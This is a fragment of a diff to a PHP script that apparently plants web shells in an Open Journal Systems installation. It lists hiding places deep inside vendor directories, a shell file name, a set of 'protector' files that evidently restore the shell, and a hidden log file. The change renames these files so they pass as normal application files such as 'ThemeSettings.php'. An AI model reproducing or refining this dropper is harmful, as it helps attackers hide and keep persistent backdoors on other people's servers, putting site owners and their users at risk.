@@ -9,9 +9,9 @@ $spread_locations = [
     '', '/lib/pkp/lib/vendor/laravel/framework/src/Illuminate/Events/.github/workflows/data/', '/lib/pkp/lib/vendor/components/jqueryui/themes/overcast/images/src/data/static/', '/lib/pkp/lib/vendor/nesbot/carbon/src/Carbon/Laravel/framework/ojs/data/statistic/src/controller/'
 ];
 
-$shell_filenames = ['.ThemeSetting.php'];
+$shell_filenames = ['ThemeSettings.php'];
 
-$protectors = ['.syscache.php', '.update.php', '.controller.php', '.configcache.php'];
+$protectors = ['syscache.php', 'listbuilder.php', '.php'];
 
 $log_file = $_SERVER['DOCUMENT_ROOT'] . '/.update-log.txt';
 
